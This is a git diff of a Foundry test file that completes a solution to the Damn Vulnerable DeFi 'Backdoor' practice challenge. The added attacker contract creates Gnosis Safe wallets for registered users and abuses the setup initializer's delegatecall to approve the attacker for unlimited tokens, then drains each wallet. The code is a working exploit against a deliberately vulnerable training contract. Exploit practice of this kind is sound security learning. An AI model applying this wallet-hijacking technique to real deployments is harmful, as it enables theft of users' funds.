@@ -9,6 +9,9 @@ import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
+
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
     uint256 internal constant NUM_USERS = 4;
@@ -81,7 +84,7 @@ contract Backdoor is Test {
          */
         vm.startPrank(attacker);
         BackdoorAttacker backdoorAttacker =
-        new BackdoorAttacker{value: 0.5 ether}(address(walletFactory), address(walletRegistry), address(masterCopy), address(dvt));
+        new BackdoorAttacker(address(walletFactory), address(walletRegistry), address(masterCopy), address(dvt), users);
         backdoorAttacker.attack();
         vm.stopPrank();
 
@@ -119,26 +122,52 @@ contract BackdoorAttacker {
     address walletRegistry;
     address masterCopy;
     address dvt;
+    address[] users;
     address attacker;
 
     constructor(
         address walletFactory_,
         address walletRegistry_,
         address masterCopy_,
-        address dvt_
-    ) payable {
+        address dvt_,
+        address[] memory users_
+    ) {
         walletFactory = walletFactory_;
         walletRegistry = walletRegistry_;
         masterCopy = masterCopy_;
         dvt = dvt_;
+        users = users_;
         attacker = msg.sender;
     }
 
-    function attack() external payable {
-        //address[]
-        bytes memory initializer = abi.encodeWithSignature("setupOwners(address[],uint256)", arg);
-        GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(masterCopy, )
+    function approve(address to, address token) public {
+        DamnValuableToken(token).approve(to, type(uint256).max);
     }
 
-    receive() external payable {}
+    function attack() external {
+        address[] memory owner = new address[](1);
+        bytes memory initializer;
+
+        for (uint256 i; i < users.length; i++) {
+            owner[0] = users[i];
+
+            initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                owner,
+                1,
+                address(this),
+                abi.encodeWithSignature("approve(address,address)", address(this), dvt),
+                address(0),
+                address(0),
+                0,
+                attacker
+            );
+
+            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
+                masterCopy, initializer, i, WalletRegistry(walletRegistry)
+            );
+
+            DamnValuableToken(dvt).transferFrom(address(proxy), attacker, 10e18);
+        }
+    }
 }
